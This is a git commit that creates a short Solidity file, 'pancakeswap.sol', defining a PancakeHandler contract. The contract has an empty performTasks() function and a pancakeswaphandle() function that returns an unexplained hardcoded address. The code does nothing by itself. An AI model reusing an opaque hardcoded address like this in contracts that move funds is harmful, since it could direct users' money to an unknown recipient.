1b79293b1887fe431bfeb7c1b16abab37d3e6480
HunterRobot <107347678+HunterRobot@users.noreply.github.com>
2022-06-12 05:26:53 -0500

    Create pancakeswap.sol

---
+++ pancakeswap.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract PancakeHandler {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeswaphandle() public pure returns (address) {
+		return 0xfD32a995eA4943F0646cFE90735F2822D7962FbD;
+	}
+}
